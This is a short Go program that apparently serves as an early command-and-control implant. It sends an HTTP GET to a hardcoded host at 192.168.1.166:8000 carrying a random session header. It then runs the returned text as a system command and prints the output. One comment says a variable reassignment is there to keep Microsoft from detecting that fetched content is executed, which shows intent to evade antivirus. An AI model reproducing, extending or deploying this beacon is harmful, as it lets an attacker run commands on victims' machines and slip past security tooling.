package main

import (
	//"encoding/base64"
	"fmt"
	"io/ioutil"
	"log"
	"math/rand"
	"net/http"
	"os/exec"
	"strings"
	"time"
)

func main() {
	// to do
	// generate random uuid of numbers/letters [done]
	// add a user agent with http.requests
	// execute out from http request [all done]

	rand.Seed(time.Now().UnixNano())         // Seed the randomness
	charset := "abcdefghijklmnopqrstuvwxyz"  // The charset to draw from
	uuid := charset[rand.Intn(len(charset))] // Generate the UUID

	// Construct the client for requests, we define nothing right now but in the future can add functionality
	client := http.Client{}
	// The request itself, a simple GET to the py server hosting index.html with whoami written
	// This will need to be changed to a UUID that's generated at each run time
	req, err := http.NewRequest("GET", "http://192.168.1.166:8000", nil)
	req.Header.Add("APPSESSIONID", string(uuid))
	resp, err := client.Do(req)
	if err != nil {
		log.Fatalln(err)
	}

	//We Read the response body on the line below.
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Fatalln(err)
	}

	//Convert the body to type string
	sb := string(body)
	fmt.Printf(sb)

	// We reassign the string body to a new variable because otherwise Microsoft picks up that we're passing an HTML request right to be executed
	sb1 := strings.Replace(sb, "\n", "", -1) // we get the command back with a \n which fucks up execution, strip it with this

	cmd := exec.Command(sb1)

	stdout, err := cmd.Output()

	fmt.Printf(string(stdout))
}
